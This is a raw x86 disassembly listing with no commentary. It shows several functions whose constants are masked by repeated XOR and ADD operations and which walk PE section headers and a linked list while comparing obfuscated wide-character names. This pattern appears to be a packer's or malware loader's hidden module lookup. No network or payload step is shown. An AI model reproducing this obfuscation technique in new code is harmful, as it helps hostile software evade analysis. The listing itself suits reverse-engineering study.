  41f143:	pop    esi
  41f144:	pop    ebx
  41f145:	leave  
  41f146:	ret    0x1c
  41f149:	push   ebp
  41f14a:	mov    ebp,esp
  41f14c:	movzx  edx,WORD PTR [ecx+0x6]
  41f150:	movzx  eax,WORD PTR [ecx+0x14]
  41f154:	push   ebx
  41f155:	push   edi
  41f156:	xor    edi,edi
  41f158:	lea    eax,[eax+ecx*1+0x18]
  41f15c:	test   edx,edx
  41f15e:	je     0x41f17f
  41f160:	mov    ecx,DWORD PTR [eax+0xc]
  41f163:	lea    ebx,[ecx+esi*1]
  41f166:	cmp    DWORD PTR [ebp+0x8],ebx
  41f169:	jb     0x41f177
  41f16b:	mov    ebx,DWORD PTR [eax+0x8]
  41f16e:	add    ebx,ecx
  41f170:	add    ebx,esi
  41f172:	cmp    DWORD PTR [ebp+0x8],ebx
  41f175:	jb     0x41f181
  41f177:	add    eax,0x28
  41f17a:	inc    edi
  41f17b:	cmp    edi,edx
  41f17d:	jb     0x41f160
  41f17f:	xor    eax,eax
  41f181:	pop    edi
  41f182:	pop    ebx
  41f183:	pop    ebp
  41f184:	ret    0x4
  41f187:	push   ebp
  41f188:	mov    ebp,esp
  41f18a:	sub    esp,0x34
  41f18d:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  41f194:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41f19b:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  41f1a2:	mov    DWORD PTR [ebp-0x8],0xf89c85e4
  41f1a9:	mov    DWORD PTR [ebp-0x20],0xf89c85c4
  41f1b0:	mov    DWORD PTR [ebp-0x2c],0xf89c8503
  41f1b7:	mov    DWORD PTR [ebp-0x2c],0xf89c85e3
  41f1be:	mov    DWORD PTR [ebp-0x10],eax
  41f1c1:	mov    eax,DWORD PTR [ebp+0x8]
  41f1c4:	mov    DWORD PTR [ebp-0x14],eax
  41f1c7:	mov    eax,DWORD PTR [ebp-0xc]
  41f1ca:	push   ebx
  41f1cb:	mov    ecx,0x751089b
  41f1d0:	xor    eax,ecx
  41f1d2:	push   esi
  41f1d3:	mov    esi,DWORD PTR [ebp-0x10]
  41f1d6:	mov    edx,0x3272e2
  41f1db:	add    eax,edx
  41f1dd:	push   edi
  41f1de:	cmp    esi,eax
  41f1e0:	je     0x41f3bf
  41f1e6:	mov    eax,DWORD PTR [ebp-0xc]
  41f1e9:	mov    esi,DWORD PTR [ebp-0x14]
  41f1ec:	xor    eax,ecx
  41f1ee:	add    eax,edx
  41f1f0:	cmp    esi,eax
  41f1f2:	je     0x41f3bf
  41f1f8:	mov    eax,DWORD PTR [ebp-0xc]
  41f1fb:	xor    eax,ecx
  41f1fd:	add    eax,edx
  41f1ff:	mov    DWORD PTR [ebp-0x24],eax
  41f202:	mov    eax,DWORD PTR [ebp-0xc]
  41f205:	xor    eax,ecx
  41f207:	add    eax,edx
  41f209:	mov    DWORD PTR [ebp-0x28],eax
  41f20c:	mov    edi,DWORD PTR [ebp-0x20]
  41f20f:	mov    ebx,DWORD PTR [ebp-0x8]
  41f212:	mov    esi,0x89b
  41f217:	xor    edi,esi
  41f219:	mov    eax,0x72e2
  41f21e:	xor    ebx,esi
  41f220:	add    edi,eax
  41f222:	add    ebx,eax
  41f224:	sub    ebx,edi
  41f226:	mov    WORD PTR [ebp-0x8],bx
  41f22a:	jmp    0x41f2ef
  41f22f:	mov    edi,DWORD PTR [ebp-0xc]
  41f232:	mov    bx,WORD PTR [ebp-0x4]
  41f236:	xor    edi,esi
  41f238:	add    edi,eax
  41f23a:	cmp    bx,di
  41f23d:	je     0x41f331
  41f243:	mov    edi,DWORD PTR [ebp-0xc]
  41f246:	mov    ebx,DWORD PTR [ebp+0xc]
  41f249:	xor    edi,ecx
  41f24b:	add    edi,edx
  41f24d:	cmp    ebx,edi
  41f24f:	mov    di,WORD PTR [ebp-0x4]
  41f253:	mov    bx,WORD PTR [ebp+0x8]
  41f257:	je     0x41f2c2
  41f259:	cmp    bx,di
  41f25c:	je     0x41f2cb
  41f25e:	mov    edi,DWORD PTR [ebp-0x20]
  41f261:	mov    bx,WORD PTR [ebp+0x8]
  41f265:	xor    edi,esi
  41f267:	add    edi,eax
  41f269:	cmp    bx,di
  41f26c:	jb     0x41f28c
  41f26e:	mov    edi,DWORD PTR [ebp-0x2c]
  41f271:	mov    bx,WORD PTR [ebp+0x8]
  41f275:	xor    edi,esi
  41f277:	add    edi,eax
  41f279:	cmp    bx,di
  41f27c:	ja     0x41f28c
  41f27e:	movzx  edi,WORD PTR [ebp+0x8]
  41f282:	movzx  ebx,WORD PTR [ebp-0x8]
  41f286:	add    edi,ebx
  41f288:	mov    WORD PTR [ebp+0x8],di
  41f28c:	mov    edi,DWORD PTR [ebp-0x20]
  41f28f:	mov    bx,WORD PTR [ebp-0x4]
  41f293:	xor    edi,esi
  41f295:	add    edi,eax
  41f297:	cmp    bx,di
  41f29a:	jb     0x41f2ba
  41f29c:	mov    edi,DWORD PTR [ebp-0x2c]
  41f29f:	mov    bx,WORD PTR [ebp-0x4]
  41f2a3:	xor    edi,esi
  41f2a5:	add    edi,eax
  41f2a7:	cmp    bx,di
  41f2aa:	ja     0x41f2ba
  41f2ac:	movzx  edi,WORD PTR [ebp-0x4]
  41f2b0:	movzx  ebx,WORD PTR [ebp-0x8]
  41f2b4:	add    edi,ebx
  41f2b6:	mov    WORD PTR [ebp-0x4],di
  41f2ba:	mov    di,WORD PTR [ebp-0x4]
  41f2be:	mov    bx,WORD PTR [ebp+0x8]
  41f2c2:	cmp    bx,di
  41f2c5:	jne    0x41f3bf
  41f2cb:	mov    edi,DWORD PTR [ebp-0x1c]
  41f2ce:	mov    ebx,DWORD PTR [ebp-0x10]
  41f2d1:	xor    edi,ecx
  41f2d3:	lea    edi,[edi+ebx*1+0x3272e2]
  41f2da:	mov    DWORD PTR [ebp-0x10],edi
  41f2dd:	mov    edi,DWORD PTR [ebp-0x1c]
  41f2e0:	mov    ebx,DWORD PTR [ebp-0x14]
  41f2e3:	xor    edi,ecx
  41f2e5:	lea    edi,[edi+ebx*1+0x3272e2]
  41f2ec:	mov    DWORD PTR [ebp-0x14],edi
  41f2ef:	mov    edi,DWORD PTR [ebp-0x24]
  41f2f2:	mov    ebx,DWORD PTR [ebp-0x10]
  41f2f5:	mov    di,WORD PTR [ebx+edi*2]
  41f2f9:	mov    WORD PTR [ebp+0x8],di
  41f2fd:	mov    edi,DWORD PTR [ebp-0x28]
  41f300:	mov    ebx,DWORD PTR [ebp-0x14]
  41f303:	mov    di,WORD PTR [ebx+edi*2]
  41f307:	mov    WORD PTR [ebp-0x4],di
  41f30b:	mov    edi,DWORD PTR [ebp-0xc]
  41f30e:	mov    bx,WORD PTR [ebp+0x8]
  41f312:	xor    edi,esi
  41f314:	add    edi,eax
  41f316:	cmp    bx,di
  41f319:	jne    0x41f22f
  41f31f:	mov    eax,DWORD PTR [ebp-0x18]
  41f322:	mov    esi,DWORD PTR [ebp-0xc]
  41f325:	xor    eax,ecx
  41f327:	add    eax,edx
  41f329:	imul   eax,esi
  41f32c:	mov    DWORD PTR [ebp-0xc],eax
  41f32f:	jmp    0x41f343
  41f331:	mov    eax,DWORD PTR [ebp-0xc]
  41f334:	mov    esi,DWORD PTR [ebp-0x18]
  41f337:	xor    eax,ecx
  41f339:	lea    eax,[eax+esi*1+0x3272e2]
  41f340:	mov    DWORD PTR [ebp-0x18],eax
  41f343:	mov    eax,DWORD PTR [ebp-0x24]
  41f346:	sub    eax,edx
  41f348:	xor    eax,ecx
  41f34a:	mov    DWORD PTR [ebp-0x30],eax
  41f34d:	mov    eax,DWORD PTR [ebp-0x28]
  41f350:	sub    eax,edx
  41f352:	xor    eax,ecx
  41f354:	mov    DWORD PTR [ebp-0x34],eax
  41f357:	mov    eax,DWORD PTR [ebp-0x34]
  41f35a:	mov    esi,DWORD PTR [ebp-0x1c]
  41f35d:	xor    esi,ecx
  41f35f:	add    esi,edx
  41f361:	xor    eax,ecx
  41f363:	add    eax,0x3272e2
  41f368:	imul   esi,eax
  41f36b:	mov    eax,DWORD PTR [ebp-0x14]
  41f36e:	movzx  eax,WORD PTR [esi+eax*1]
  41f372:	mov    esi,DWORD PTR [ebp-0x30]
  41f375:	mov    edi,DWORD PTR [ebp-0x1c]
  41f378:	xor    esi,ecx
  41f37a:	add    esi,edx
  41f37c:	xor    edi,ecx
  41f37e:	add    edi,edx
  41f380:	imul   edi,esi
  41f383:	mov    esi,DWORD PTR [ebp-0x10]
  41f386:	movzx  esi,WORD PTR [edi+esi*1]
  41f38a:	sub    eax,edx
  41f38c:	sub    esi,edx
  41f38e:	xor    eax,ecx
  41f390:	xor    esi,ecx
  41f392:	cmp    esi,eax
  41f394:	jne    0x41f3bf
  41f396:	mov    eax,DWORD PTR [ebp-0x30]
  41f399:	mov    esi,DWORD PTR [ebp-0x1c]
  41f39c:	xor    eax,ecx
  41f39e:	add    eax,0x3272e2
  41f3a3:	xor    esi,ecx
  41f3a5:	add    esi,edx
  41f3a7:	imul   esi,eax
  41f3aa:	mov    eax,DWORD PTR [ebp-0x10]
  41f3ad:	movzx  eax,WORD PTR [esi+eax*1]
  41f3b1:	mov    esi,DWORD PTR [ebp-0xc]
  41f3b4:	sub    eax,edx
  41f3b6:	xor    eax,ecx
  41f3b8:	cmp    eax,esi
  41f3ba:	mov    eax,DWORD PTR [ebp-0xc]
  41f3bd:	je     0x41f3c2
  41f3bf:	mov    eax,DWORD PTR [ebp-0x18]
  41f3c2:	pop    edi
  41f3c3:	xor    eax,ecx
  41f3c5:	pop    esi
  41f3c6:	add    eax,edx
  41f3c8:	pop    ebx
  41f3c9:	leave  
  41f3ca:	ret    0x8
  41f3cd:	push   ebp
  41f3ce:	mov    ebp,esp
  41f3d0:	push   ecx
  41f3d1:	mov    cx,WORD PTR [eax]
  41f3d4:	push   esi
  41f3d5:	mov    esi,0x3b51
  41f3da:	sub    cx,si
  41f3dd:	mov    esi,0x8a8d
  41f3e2:	xor    cx,si
  41f3e5:	mov    esi,0x4e22
  41f3ea:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f3f1:	mov    edx,0xf89c8585
  41f3f6:	cmp    cx,si
  41f3f9:	je     0x41f458
  41f3fb:	push   ebx
  41f3fc:	push   edi
  41f3fd:	movzx  ecx,cx
  41f400:	mov    edi,0xffcd8d1e
  41f405:	mov    esi,0x751089b
  41f40a:	mov    ebx,0x4f86
  41f40f:	cmp    cx,bx
  41f412:	jne    0x41f417
  41f414:	mov    DWORD PTR [ebp-0x4],edx
  41f417:	lea    edx,[edi+0x1]
  41f41a:	xor    edx,esi
  41f41c:	mov    edi,edx
  41f41e:	xor    edi,esi
  41f420:	mov    cx,WORD PTR [eax+edi*2+0x64e5c4]
  41f428:	mov    ebx,0x3b51
  41f42d:	sub    cx,bx
  41f430:	mov    ebx,0x8a8d
  41f435:	xor    cx,bx
  41f438:	mov    ebx,0x4e22
  41f43d:	cmp    cx,bx
  41f440:	jne    0x41f40a
  41f442:	mov    ecx,DWORD PTR [ebp-0x4]
  41f445:	pop    edi
  41f446:	pop    ebx
  41f447:	cmp    ecx,0xf89c8586
  41f44d:	je     0x41f458
  41f44f:	xor    ecx,esi
  41f451:	lea    eax,[eax+ecx*2+0x64e5c6]
  41f458:	pop    esi
  41f459:	leave  
  41f45a:	ret    
  41f45b:	push   ebp
  41f45c:	mov    ebp,esp
  41f45e:	push   ecx
  41f45f:	push   esi
  41f460:	push   edi
  41f461:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f468:	mov    esi,0xf89c8585
  41f46d:	call   0x41f3cd
  41f472:	mov    edi,eax
  41f474:	mov    al,BYTE PTR [edi]
  41f476:	add    al,0x8
  41f478:	xor    al,0x74
  41f47a:	cmp    al,0x7c
  41f47c:	je     0x41f4df
  41f47e:	mov    eax,edi
  41f480:	mov    edx,0xffcd8d1e
  41f485:	mov    ecx,0x751089b
  41f48a:	push   ebx
  41f48b:	mov    ax,WORD PTR [eax]
  41f48e:	mov    ebx,0x3b51
  41f493:	sub    ax,bx
  41f496:	mov    ebx,0x8a8d
  41f49b:	xor    ax,bx
  41f49e:	mov    ebx,0x4e50
  41f4a3:	cmp    ax,bx
  41f4a6:	jne    0x41f4ab
  41f4a8:	mov    DWORD PTR [ebp-0x4],esi
  41f4ab:	lea    esi,[edx+0x1]
  41f4ae:	xor    esi,ecx
  41f4b0:	mov    edx,esi
  41f4b2:	xor    edx,ecx
  41f4b4:	lea    eax,[edi+edx*2+0x64e5c4]
  41f4bb:	mov    bl,BYTE PTR [eax]
  41f4bd:	add    bl,0x8
  41f4c0:	xor    bl,0x74
  41f4c3:	cmp    bl,0x7c
  41f4c6:	jne    0x41f48b
  41f4c8:	mov    eax,DWORD PTR [ebp-0x4]
  41f4cb:	pop    ebx
  41f4cc:	cmp    eax,0xf89c8586
  41f4d1:	je     0x41f4df
  41f4d3:	xor    eax,ecx
  41f4d5:	xor    ecx,ecx
  41f4d7:	mov    WORD PTR [edi+eax*2+0x64e5c4],cx
  41f4df:	mov    eax,edi
  41f4e1:	pop    edi
  41f4e2:	pop    esi
  41f4e3:	leave  
  41f4e4:	ret    
  41f4e5:	push   ebp
  41f4e6:	mov    ebp,esp
  41f4e8:	push   ecx
  41f4e9:	push   esi
  41f4ea:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f4f1:	mov    esi,0xf89c8585
  41f4f6:	call   0x41f3cd
  41f4fb:	mov    cx,WORD PTR [eax]
  41f4fe:	mov    edx,0x3b51
  41f503:	sub    cx,dx
  41f506:	mov    edx,0x8a8d
  41f50b:	xor    cx,dx
  41f50e:	mov    edx,0x4e22
  41f513:	cmp    cx,dx
  41f516:	je     0x41f56f
  41f518:	push   ebx
  41f519:	push   edi
  41f51a:	movzx  ecx,cx
  41f51d:	mov    edx,0xffcd8d1e
  41f522:	mov    edi,0x751089b
  41f527:	mov    ebx,0x4e50
  41f52c:	cmp    cx,bx
  41f52f:	jne    0x41f534
  41f531:	mov    DWORD PTR [ebp-0x4],esi
  41f534:	lea    esi,[edx+0x1]
  41f537:	xor    esi,edi
  41f539:	mov    edx,esi
  41f53b:	xor    edx,edi
  41f53d:	mov    cx,WORD PTR [eax+edx*2+0x64e5c4]
  41f545:	mov    ebx,0x3b51
  41f54a:	sub    cx,bx
  41f54d:	mov    ebx,0x8a8d
  41f552:	xor    cx,bx
  41f555:	mov    ebx,0x4e22
  41f55a:	cmp    cx,bx
  41f55d:	jne    0x41f527
  41f55f:	cmp    DWORD PTR [ebp-0x4],0xf89c8586
  41f566:	pop    edi
  41f567:	pop    ebx
  41f568:	je     0x41f56f
  41f56a:	xor    eax,eax
  41f56c:	inc    eax
  41f56d:	jmp    0x41f571
  41f56f:	xor    eax,eax
  41f571:	pop    esi
  41f572:	leave  
  41f573:	ret    
  41f574:	push   ebp
  41f575:	mov    ebp,esp
  41f577:	push   ecx
  41f578:	mov    eax,DWORD PTR [ebp+0x8]
  41f57b:	movzx  ecx,WORD PTR [eax]
  41f57e:	push   esi
  41f57f:	lea    eax,[ecx-0x3b51]
  41f585:	mov    esi,0x8a8d
  41f58a:	push   edi
  41f58b:	xor    eax,esi
  41f58d:	mov    edi,0x4e22
  41f592:	mov    DWORD PTR [ebp-0x4],edx
  41f595:	cmp    ax,di
  41f598:	je     0x41f5c5
  41f59a:	mov    eax,DWORD PTR [ebp+0x8]
  41f59d:	sub    eax,edx
  41f59f:	mov    DWORD PTR [ebp+0x8],eax
  41f5a2:	jmp    0x41f5a7
  41f5a4:	mov    eax,DWORD PTR [ebp+0x8]
  41f5a7:	mov    WORD PTR [edx],cx
  41f5aa:	add    edx,0x2
  41f5ad:	movzx  edi,WORD PTR [eax+edx*1]
  41f5b1:	mov    ecx,edi
  41f5b3:	add    edi,0xffffc4af
  41f5b9:	xor    edi,esi
  41f5bb:	mov    eax,0x4e22
  41f5c0:	cmp    di,ax
  41f5c3:	jne    0x41f5a4
  41f5c5:	xor    eax,eax
  41f5c7:	pop    edi
  41f5c8:	mov    WORD PTR [edx],ax
  41f5cb:	mov    eax,DWORD PTR [ebp-0x4]
  41f5ce:	pop    esi
  41f5cf:	leave  
  41f5d0:	ret    0x4
  41f5d3:	push   ebp
  41f5d4:	mov    ebp,esp
  41f5d6:	sub    esp,0x18
  41f5d9:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41f5e0:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41f5e7:	mov    eax,DWORD PTR [ebp-0x14]
  41f5ea:	xor    eax,0x751089b
  41f5ef:	add    eax,0x3272e2
  41f5f4:	mov    DWORD PTR [ebp-0x8],eax
  41f5f7:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  41f5fe:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  41f605:	mov    DWORD PTR [ebp-0x4],0xf89c85bb
  41f60c:	mov    eax,DWORD PTR [ebp-0x14]
  41f60f:	xor    eax,0x751089b
  41f614:	mov    ecx,DWORD PTR [ebp-0x8]
  41f617:	lea    eax,[ecx+eax*1+0x3272e2]
  41f61e:	mov    ecx,DWORD PTR [ebp-0x18]
  41f621:	xor    ecx,0x751089b
  41f627:	add    ecx,0x3272e2
  41f62d:	mov    edx,DWORD PTR [ebp+0x10]
  41f630:	imul   edx,ecx
  41f633:	cmp    eax,edx
  41f635:	jae    0x41f728
  41f63b:	mov    eax,DWORD PTR [ebp+0x10]
  41f63e:	mov    ecx,DWORD PTR [ebp-0x8]
  41f641:	sub    eax,ecx
  41f643:	mov    ecx,DWORD PTR [ebp-0x10]
  41f646:	xor    ecx,0x751089b
  41f64c:	add    ecx,0x3272e2
  41f652:	cmp    eax,ecx
  41f654:	jbe    0x41f686
  41f656:	mov    eax,DWORD PTR [ebp+0x8]
  41f659:	add    eax,DWORD PTR [ebp-0x8]
  41f65c:	mov    ecx,DWORD PTR [ebp+0xc]
  41f65f:	add    ecx,DWORD PTR [ebp-0x8]
  41f662:	mov    edx,DWORD PTR [ecx]
  41f664:	mov    DWORD PTR [eax],edx
  41f666:	mov    ecx,DWORD PTR [ecx+0x4]
  41f669:	mov    DWORD PTR [eax+0x4],ecx
  41f66c:	mov    eax,DWORD PTR [ebp-0x10]
  41f66f:	xor    eax,0x751089b
  41f674:	mov    ecx,DWORD PTR [ebp-0x8]
  41f677:	lea    eax,[ecx+eax*1+0x3272e2]
  41f67e:	mov    DWORD PTR [ebp-0x8],eax
  41f681:	jmp    0x41f723
  41f686:	mov    eax,DWORD PTR [ebp+0x10]
  41f689:	mov    ecx,DWORD PTR [ebp-0x8]
  41f68c:	sub    eax,ecx
  41f68e:	mov    ecx,DWORD PTR [ebp-0xc]
  41f691:	xor    ecx,0x751089b
  41f697:	add    ecx,0x3272e2
  41f69d:	cmp    eax,ecx
  41f69f:	jbe    0x41f6c8
  41f6a1:	mov    eax,DWORD PTR [ebp+0x8]
  41f6a4:	add    eax,DWORD PTR [ebp-0x8]
  41f6a7:	mov    ecx,DWORD PTR [ebp+0xc]
  41f6aa:	add    ecx,DWORD PTR [ebp-0x8]
  41f6ad:	mov    ecx,DWORD PTR [ecx]
  41f6af:	mov    DWORD PTR [eax],ecx
  41f6b1:	mov    eax,DWORD PTR [ebp-0xc]
  41f6b4:	xor    eax,0x751089b
  41f6b9:	mov    ecx,DWORD PTR [ebp-0x8]
  41f6bc:	lea    eax,[ecx+eax*1+0x3272e2]
  41f6c3:	mov    DWORD PTR [ebp-0x8],eax
  41f6c6:	jmp    0x41f723
  41f6c8:	mov    eax,DWORD PTR [ebp+0x10]
  41f6cb:	mov    ecx,DWORD PTR [ebp-0x8]
  41f6ce:	sub    eax,ecx
  41f6d0:	mov    ecx,DWORD PTR [ebp-0x4]
  41f6d3:	xor    ecx,0x751089b
  41f6d9:	add    ecx,0x3272e2
  41f6df:	cmp    eax,ecx
  41f6e1:	jbe    0x41f70c
  41f6e3:	mov    eax,DWORD PTR [ebp+0x8]
  41f6e6:	add    eax,DWORD PTR [ebp-0x8]
  41f6e9:	mov    ecx,DWORD PTR [ebp+0xc]
  41f6ec:	add    ecx,DWORD PTR [ebp-0x8]
  41f6ef:	mov    cx,WORD PTR [ecx]
  41f6f2:	mov    WORD PTR [eax],cx
  41f6f5:	mov    eax,DWORD PTR [ebp-0x4]
  41f6f8:	xor    eax,0x751089b
  41f6fd:	mov    ecx,DWORD PTR [ebp-0x8]
  41f700:	lea    eax,[ecx+eax*1+0x3272e2]
  41f707:	mov    DWORD PTR [ebp-0x8],eax
  41f70a:	jmp    0x41f723
  41f70c:	mov    eax,DWORD PTR [ebp+0x8]
  41f70f:	add    eax,DWORD PTR [ebp-0x8]
  41f712:	mov    ecx,DWORD PTR [ebp+0xc]
  41f715:	add    ecx,DWORD PTR [ebp-0x8]
  41f718:	mov    cl,BYTE PTR [ecx]
  41f71a:	mov    BYTE PTR [eax],cl
  41f71c:	mov    eax,DWORD PTR [ebp-0x8]
  41f71f:	inc    eax
  41f720:	mov    DWORD PTR [ebp-0x8],eax
  41f723:	jmp    0x41f60c
  41f728:	leave  
  41f729:	ret    0xc
  41f72c:	push   ebp
  41f72d:	mov    ebp,esp
  41f72f:	sub    esp,0xc
  41f732:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41f739:	push   esi
  41f73a:	mov    esi,eax
  41f73c:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  41f743:	mov    edx,DWORD PTR [ebp-0x4]
  41f746:	mov    eax,0x751089b
  41f74b:	xor    edx,eax
  41f74d:	mov    ecx,0x3272e2
  41f752:	add    edx,ecx
  41f754:	cmp    esi,edx
  41f756:	je     0x41f798
  41f758:	push   ebx
  41f759:	push   edi
  41f75a:	mov    edx,DWORD PTR [ebp-0x8]
  41f75d:	mov    ebx,DWORD PTR [ebp+0x8]
  41f760:	xor    edx,eax
  41f762:	mov    edi,0xffcd8d1e
  41f767:	sub    edi,edx
  41f769:	add    esi,edi
  41f76b:	lea    edx,[esi-0x3272e2]
  41f771:	xor    edx,eax
  41f773:	mov    DWORD PTR [ebp-0xc],edx
  41f776:	mov    edx,DWORD PTR [ebp-0x4]
  41f779:	mov    edi,DWORD PTR [ebp-0xc]
  41f77c:	xor    dl,0x9b
  41f77f:	sub    dl,0x1e
  41f782:	xor    edi,eax
  41f784:	mov    BYTE PTR [edi+ebx*1+0x3272e2],dl
  41f78b:	mov    edx,DWORD PTR [ebp-0x4]
  41f78e:	xor    edx,eax
  41f790:	add    edx,ecx
  41f792:	cmp    esi,edx
  41f794:	jne    0x41f75a
  41f796:	pop    edi
  41f797:	pop    ebx
  41f798:	pop    esi
  41f799:	leave  
  41f79a:	ret    0x4
  41f79d:	push   ebp
  41f79e:	mov    ebp,esp
  41f7a0:	sub    esp,0x21c
  41f7a6:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41f7ad:	mov    DWORD PTR [ebp-0x14],0xf89c8584
  41f7b4:	mov    eax,DWORD PTR [ebp+0x10]
  41f7b7:	mov    eax,DWORD PTR [ebp-0x4]
  41f7ba:	mov    ecx,DWORD PTR [ebp+0x8]
  41f7bd:	push   esi
  41f7be:	push   edi
  41f7bf:	mov    edi,0x751089b
  41f7c4:	xor    eax,edi
  41f7c6:	mov    esi,0x3272e2
  41f7cb:	add    eax,esi
  41f7cd:	cmp    eax,ecx
  41f7cf:	mov    eax,DWORD PTR [ebp-0x4]
  41f7d2:	jne    0x41f7dd
  41f7d4:	xor    eax,edi
  41f7d6:	add    eax,esi
  41f7d8:	jmp    0x41f889
  41f7dd:	mov    ecx,DWORD PTR [ebp+0xc]
  41f7e0:	xor    eax,edi
  41f7e2:	add    eax,esi
  41f7e4:	cmp    eax,ecx
  41f7e6:	jne    0x41f7ed
  41f7e8:	mov    eax,DWORD PTR [ebp-0x4]
  41f7eb:	jmp    0x41f7d4
  41f7ed:	lea    eax,[ebp-0x21c]
  41f7f3:	mov    DWORD PTR [ebp-0x8],eax
  41f7f6:	mov    eax,DWORD PTR [ebp+0xc]
  41f7f9:	mov    DWORD PTR [ebp-0x10],eax
  41f7fc:	mov    eax,DWORD PTR [ebp-0x4]
  41f7ff:	xor    eax,edi
  41f801:	add    eax,esi
  41f803:	mov    DWORD PTR [ebp+0x10],eax
  41f806:	mov    eax,DWORD PTR [ebp+0xc]
  41f809:	push   ebx
  41f80a:	call   0x41f4e5
  41f80f:	mov    ebx,eax
  41f811:	mov    eax,DWORD PTR [ebp+0x8]
  41f814:	mov    eax,DWORD PTR [eax+0x14]
  41f817:	jmp    0x41f871
  41f819:	mov    eax,DWORD PTR [ebp+0xc]
  41f81c:	sub    eax,0x8
  41f81f:	mov    DWORD PTR [ebp-0xc],eax
  41f822:	mov    eax,DWORD PTR [ebp-0xc]
  41f825:	mov    eax,DWORD PTR [eax+0x28]
  41f828:	call   0x41f3cd
  41f82d:	mov    DWORD PTR [ebp+0x10],eax
  41f830:	push   DWORD PTR [ebp+0x10]
  41f833:	mov    edx,DWORD PTR [ebp-0x8]
  41f836:	call   0x41f574
  41f83b:	mov    eax,DWORD PTR [ebp-0x4]
  41f83e:	xor    eax,edi
  41f840:	add    eax,esi
  41f842:	cmp    eax,ebx
  41f844:	jne    0x41f84e
  41f846:	mov    eax,DWORD PTR [ebp-0x8]
  41f849:	call   0x41f45b
  41f84e:	mov    eax,DWORD PTR [ebp-0x14]
  41f851:	xor    eax,edi
  41f853:	add    eax,esi
  41f855:	push   eax
  41f856:	push   DWORD PTR [ebp-0x10]
  41f859:	mov    eax,DWORD PTR [ebp-0x8]
  41f85c:	call   0x41f187
  41f861:	mov    ecx,DWORD PTR [ebp-0x4]
  41f864:	xor    ecx,edi
  41f866:	add    ecx,esi
  41f868:	cmp    eax,ecx
  41f86a:	je     0x41f88f
  41f86c:	mov    eax,DWORD PTR [ebp+0xc]
  41f86f:	mov    eax,DWORD PTR [eax]
  41f871:	mov    DWORD PTR [ebp+0xc],eax
  41f874:	mov    eax,DWORD PTR [ebp+0x8]
  41f877:	mov    ecx,DWORD PTR [ebp+0xc]
  41f87a:	add    eax,0x14
  41f87d:	cmp    ecx,eax
  41f87f:	jne    0x41f819
  41f881:	mov    eax,DWORD PTR [ebp-0x4]
  41f884:	xor    eax,edi
  41f886:	add    eax,esi
  41f888:	pop    ebx
  41f889:	pop    edi
  41f88a:	pop    esi
  41f88b:	leave  
  41f88c:	ret    0xc
  41f88f:	mov    eax,DWORD PTR [ebp-0xc]
  41f892:	mov    eax,DWORD PTR [eax+0x18]
  41f895:	jmp    0x41f888
  41f897:	push   ebp
  41f898:	mov    ebp,esp
  41f89a:	mov    eax,DWORD PTR [ebp+0xc]
  41f89d:	sub    esp,0x10
  41f8a0:	cmp    DWORD PTR [ebp+0x8],0x0
  41f8a4:	push   ebx
  41f8a5:	push   esi
  41f8a6:	push   edi
  41f8a7:	je     0x41f95c
  41f8ad:	test   eax,eax
  41f8af:	je     0x41f95c
  41f8b5:	movzx  eax,WORD PTR [eax+0x20]
  41f8b9:	mov    ecx,eax
  41f8bb:	mov    DWORD PTR [ebp-0x10],eax
  41f8be:	xor    edx,edx
  41f8c0:	and    DWORD PTR [ebp-0x8],edx
  41f8c3:	mov    eax,0x8a8d
  41f8c8:	xor    ecx,eax
  41f8ca:	add    ecx,0x3b51
  41f8d0:	mov    DWORD PTR [ebp-0xc],ecx
  41f8d3:	and    DWORD PTR [ebp-0x4],0x0
  41f8d7:	xor    ecx,ecx
  41f8d9:	push   0x7e
  41f8db:	pop    edi
  41f8dc:	cmp    cx,WORD PTR [ebp-0xc]
  41f8e0:	jae    0x41f946
  41f8e2:	lea    esi,[edx-0x3b51]
  41f8e8:	xor    esi,eax
  41f8ea:	movzx  ecx,WORD PTR [ebp-0x4]
  41f8ee:	mov    ebx,DWORD PTR [ebp+0xc]
  41f8f1:	lea    ecx,[ebx+ecx*4]
  41f8f4:	cmp    WORD PTR [ecx+0x2],si
  41f8f8:	jne    0x41f931
  41f8fa:	movzx  ecx,WORD PTR [ecx]
  41f8fd:	mov    edi,0x4e22
  41f902:	cmp    cx,di
  41f905:	jne    0x41f913
  41f907:	mov    ebx,DWORD PTR [ebp+0x8]
  41f90a:	movzx  edi,dx
  41f90d:	cmp    BYTE PTR [edi+ebx*1],0x0
  41f911:	je     0x41f940
  41f913:	mov    ebx,DWORD PTR [ebp+0x8]
  41f916:	movzx  edi,dx
  41f919:	movsx  di,BYTE PTR [edi+ebx*1]
  41f91e:	mov    ebx,0x3b51
  41f923:	sub    di,bx
  41f926:	xor    di,ax
  41f929:	cmp    cx,di
  41f92c:	je     0x41f940
  41f92e:	push   0x7c
  41f930:	pop    edi
  41f931:	inc    DWORD PTR [ebp-0x4]
  41f934:	mov    cx,WORD PTR [ebp-0xc]
  41f938:	cmp    WORD PTR [ebp-0x4],cx
  41f93c:	jb     0x41f8ea
  41f93e:	jmp    0x41f946
  41f940:	inc    DWORD PTR [ebp-0x8]
  41f943:	push   0x7d
  41f945:	pop    edi
  41f946:	mov    esi,DWORD PTR [ebp+0x8]
  41f949:	movzx  ecx,dx
  41f94c:	cmp    BYTE PTR [ecx+esi*1],0x0
  41f950:	je     0x41f965
  41f952:	inc    edx
  41f953:	cmp    edi,0x7c
  41f956:	jne    0x41f8d3
  41f95c:	xor    eax,eax
  41f95e:	pop    edi
  41f95f:	pop    esi
  41f960:	pop    ebx
  41f961:	leave  
  41f962:	ret    0x8
  41f965:	mov    ecx,DWORD PTR [ebp-0x8]
  41f968:	add    ecx,0xffffc4af
  41f96e:	xor    cx,ax
  41f971:	xor    eax,eax
  41f973:	cmp    cx,WORD PTR [ebp-0x10]
  41f977:	sete   al
  41f97a:	jmp    0x41f95e
  41f97c:	push   ebp
  41f97d:	mov    ebp,esp
